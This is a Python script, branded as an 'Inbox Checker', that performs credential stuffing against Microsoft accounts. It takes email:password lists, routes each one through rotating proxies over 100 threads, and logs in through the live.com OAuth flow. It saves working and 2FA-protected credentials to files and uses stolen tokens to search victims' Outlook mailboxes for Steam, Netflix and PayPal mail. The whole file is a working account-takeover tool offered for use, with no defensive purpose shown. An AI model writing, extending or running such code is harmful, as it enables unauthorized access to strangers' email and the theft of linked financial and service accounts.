import concurrent.futures
import configparser
import os
import random
import re
import sys
import threading
import time
import uuid
import requests
import urllib3
import ctypes
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from collections import deque
from urllib3.util.retry import Retry
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if sys.platform == 'win32':
    os.system('cls')
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Inbox Checker | Starting...")
    except:
        pass
else:
    os.system('clear')

print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()

stats = {
    'checked': 0,
    'valid': 0,
    'inbox': 0,
    'custom': 0,
    'bad': 0,
    '2fa': 0,
    'errors': 0,
    'retries': 0,
    'cpm': 0
}

TOTAL_ACCOUNTS = 0

start_time = time.time()

class ConfigLoader:
    def __init__(self, config_file='config_inbox.ini'):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.load_config()

    def load_config(self):
        if not os.path.exists(self.config_file):
            self.create_default_config()
        
        try:
            self.config.read(self.config_file, encoding='utf-8')
            self.parse_config()
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading config: {e}")
            self.create_default_config()
            self.parse_config()

    def create_default_config(self):
        if not 'General' in self.config:
            self.config['General'] = {}
        self.config['General'] = {
            'threads': '100',
            'timeout': '15',
            'proxies_file': 'proxies.txt',
            'accounts_file': 'acc.txt'
        }
        if not 'Inbox' in self.config:
            self.config['Inbox'] = {}
        self.config['Inbox'] = {
            'keywords': 'Steam, Netflix, PayPal'
        }
        with open(self.config_file, 'w', encoding='utf-8') as f:
            self.config.write(f)
        print(f"{Fore.GREEN}[+] Created default config: {self.config_file}")

    def parse_config(self):
        self.settings['threads'] = self.config.getint('General', 'threads', fallback=100)
        self.settings['timeout'] = self.config.getint('General', 'timeout', fallback=15)
        self.settings['proxies_file'] = self.config.get('General', 'proxies_file', fallback='proxies.txt')
        self.settings['accounts_file'] = self.config.get('General', 'accounts_file', fallback='acc.txt')
        
        keywords_str = self.config.get('Inbox', 'keywords', fallback='Steam, Netflix')
        self.settings['inbox_keywords'] = [k.strip() for k in keywords_str.split(',') if k.strip()]

config_loader = ConfigLoader()
CONFIG = config_loader.settings

def get_progress_string():
    return f"{stats['checked']}/{TOTAL_ACCOUNTS}"

def get_timestamp():
    return time.strftime("%H:%M:%S")

def log(message, level='INFO', index=None):
    if index is None:
        progress = get_progress_string()
    else:
        progress = f"{index}/{TOTAL_ACCOUNTS}"
    
    if level == 'INFO':
        print(f"{Fore.CYAN}[{progress}] {Fore.BLUE}[INFO] {Fore.WHITE}{message}")
    elif level == 'SUCCESS':
        with print_lock:
            print(f"{Fore.CYAN}[{progress}] {Fore.GREEN}[Valid] {Fore.WHITE}{message}")
    elif level == 'INBOX':
        with print_lock:
            print(f"{Fore.CYAN}[{progress}] {Fore.MAGENTA}[INBOX] {Fore.WHITE}{message}")
    elif level == 'BAD':
        with print_lock:
            print(f"{Fore.CYAN}[{progress}] {Fore.RED}[BAD] {Fore.WHITE}{message}")
    elif level == 'ERROR':
        with print_lock:
            print(f"{Fore.CYAN}[{progress}] {Fore.RED}[ERROR] {Fore.WHITE}{message}")
    elif level == '2FA':
        with print_lock:
            print(f"{Fore.CYAN}[{progress}] {Fore.YELLOW}[2FA] {Fore.WHITE}{message}")

    
def save_result(filename, content):
    with file_lock:
        if not os.path.exists('Results'):
            os.makedirs('Results')
        with open(f'Results/{filename}', 'a', encoding='utf-8') as f:
            f.write(content + '\n')


def format_proxy(proxy):
    if not proxy: return None
    proxy = proxy.strip()
    
    if proxy.startswith('http'):
        return proxy
        
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    else:
        return f"http://{proxy}"

def create_optimized_session():
    session = requests.Session()
    threads = CONFIG.get('threads', 100)
    pool_size = threads + 50
    
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=pool_size, pool_maxsize=pool_size)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.session = create_optimized_session()
        self.session.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'keep-alive', 
                    'Upgrade-Insecure-Requests': '1'
                }
                
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=CONFIG['timeout'], verify=False).text
                
                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                       re.search('value="(.+?)"', text, re.S) or \
                       re.search("sFTTag:'(.+?)'", text, re.S) or \
                       re.search('sFTTag:"(.+?)"', text, re.S) or \
                       re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                
                if match:
                    sFTTag = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                           re.search("urlPost:'(.+?)'", text, re.S) or \
                           re.search('urlPost:"(.+?)"', text, re.S) or \
                           re.search('<form.*?action="(.+?)"', text, re.S)
                    
                    if match:
                        urlPost = match.group(1)
                        urlPost = urlPost.replace('&amp;', '&')
                        return urlPost, sFTTag
            except Exception:
                pass
            
            attempts += 1
            time.sleep(0.5)
        
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'close'
                }
                
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'
                
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        
                        if ipt and pprid and uaid:
                            data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=data, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except:
                        pass
                
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'
                
                elif any(value in login_request.text.lower() for value in [
                    'password is incorrect', 
                    "account doesn't exist", 
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account'
                ]):
                    return 'BAD'
                
            except Exception:
                pass
            
            tries += 1
            time.sleep(0.5)
        
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
            return token
        except:
            return None

    def check_inbox(self):
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []

        cid = self.session.cookies.get('MSPCID', self.email)
        
        headers = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }

        found_info = []
        keywords = CONFIG['inbox_keywords']
        total_found_sum = 0
        
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        
        for keyword in keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': keyword},
                        'Size': 25,
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set:
                                        total = result_set['Total']
                                    elif 'ResultCount' in result_set:
                                        total = result_set['ResultCount']
                                    elif 'Results' in result_set:
                                        total = len(result_set['Results'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except:
                pass
                
        return total_found_sum, found_info

def check_account_wrapper(combo, index, limiter):
    try:
        check_account(combo, index)
    finally:
        limiter.release()

def check_account(combo, index):
    global proxies
    try:
        if ':' not in combo:
            return
        
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        
        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))
        
        checker = MicrosoftInboxChecker(email, password, proxy)
        
        status = checker.login()
        
        if status == 'SUCCESS':
            with stats_lock:
                stats['valid'] += 1
            
            save_result('Valid.txt', f"{email}:{password}")
            log(f"{email}", 'SUCCESS', index)
            
            total_count, inbox_hits = checker.check_inbox()
            
            if total_count > 0:
                hits_str = ', '.join(inbox_hits)
                save_string = f"{email}:{password} | {total_count} Email Found | [{hits_str}]"
                save_result('Inbox.txt', save_string)
                
                with stats_lock:
                    stats['inbox'] += 1
                
                
        elif status == '2FA':
            with stats_lock:
                stats['2fa'] += 1
            save_result('2FA.txt', f"{email}:{password}")
            log(f"{email}", '2FA', index)
            
        else:
            with stats_lock:
                stats['bad'] += 1
                log(f"{email}", 'BAD', index) 
    
    except Exception as e:
        with stats_lock:
            stats['errors'] += 1
        print(f"{Fore.RED}[!] Thread Error: {e}")
    finally:
        with stats_lock:
            stats['checked'] += 1
        update_title()

def update_title():
    processed = stats['checked']
    elapsed = time.time() - start_time
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    
    title = f"Ver3xl_Tools | Checked:{processed}/{TOTAL_ACCOUNTS} | Valid: {stats['valid']} | Bads: {stats['bad']} | Cpm: {cpm}"
    if sys.platform == 'win32':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass

def main():
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

    print(f"{Fore.MAGENTA} /$$$$$$ /$$   /$$ /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$ ")
    print(f"{Fore.MAGENTA}|_  $$_/| $$$ | $$| $$__  $$ /$$__  $$| $$  / $$| $$_____/| $$__  $$")
    print(f"{Fore.MAGENTA}  | $$  | $$$$| $$| $$  \ $$| $$  \ $$|  $$/ $$/| $$      | $$  \ $$")
    print(f"{Fore.MAGENTA}  | $$  | $$ $$ $$| $$$$$$$ | $$  | $$ \  $$$$/ | $$$$$   | $$$$$$$/")
    print(f"{Fore.MAGENTA}  | $$  | $$  $$$$| $$__  $$| $$  | $$  >$$  $$ | $$__/   | $$__  $$")
    print(f"{Fore.MAGENTA}  | $$  | $$\  $$$| $$  \ $$| $$  | $$ /$$/\  $$| $$      | $$  \ $$")
    print(f"{Fore.MAGENTA} /$$$$$$| $$ \  $$| $$$$$$$/|  $$$$$$/| $$  \ $$| $$$$$$$$| $$  | $$")
    print(f"{Fore.MAGENTA}|______/|__/  \__/|_______/  \______/ |__/  |__/|________/|__/  |__/")
    print(f"{Fore.MAGENTA}                                                                    ")
    print(f"{Fore.MAGENTA}                                                                    ")
    print(f"{Fore.MAGENTA}                                                                    ")

    global proxies
    proxies = []
    
    if os.path.exists(CONFIG['proxies_file']):
        with open(CONFIG['proxies_file'], 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
    else:
        pass

    if not os.path.exists(CONFIG['accounts_file']):
        print(f"{Fore.RED}[!] Accounts file not found: {CONFIG['accounts_file']}")
        with open(CONFIG['accounts_file'], 'w') as f:
            f.write("email:pass\n")
        print(f"{Fore.YELLOW}[*] Created dummy {CONFIG['accounts_file']}. Please add accounts.")
        return

    with open(CONFIG['accounts_file'], 'r', encoding='utf-8') as f:
        accounts = [line.strip() for line in f if ':' in line]
    
    if not accounts:
        print(f"{Fore.RED}[!] No accounts found in {CONFIG['accounts_file']}")
        return

    print(f"{Fore.GREEN}[*] Loaded {len(accounts)} accounts.")
    global TOTAL_ACCOUNTS
    TOTAL_ACCOUNTS = len(accounts)
    
    print(f"{Fore.CYAN}[*] Threads: {CONFIG['threads']}")
    print(f"{Fore.CYAN}[*] Inbox Keywords: {', '.join(CONFIG['inbox_keywords'])}")
    
    def ui_loop():
        while stats['checked'] < len(accounts):
            time.sleep(1)
            update_title()

    threading.Thread(target=ui_loop, daemon=True).start()

    max_threads = CONFIG['threads']
    print(f"{Fore.CYAN}[*] Starting Worker Loop with {max_threads} dynamic threads...")
    
    accounts_deque = deque(accounts)
    thread_limiter = threading.BoundedSemaphore(max_threads)
    
    current_index = 0
    while accounts_deque:
        thread_limiter.acquire() 
            
        account = accounts_deque.popleft()
        current_index += 1
        t = threading.Thread(target=check_account_wrapper, args=(account, current_index, thread_limiter))
        t.start()

    
    while threading.active_count() > 2:
        time.sleep(1)
        update_title()
    
    print(f"\n{Fore.GREEN}[*] Checking Completed.")
    print(f"Valid: {stats['valid']}")
    print(f"Inbox Hits: {stats['inbox']}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit()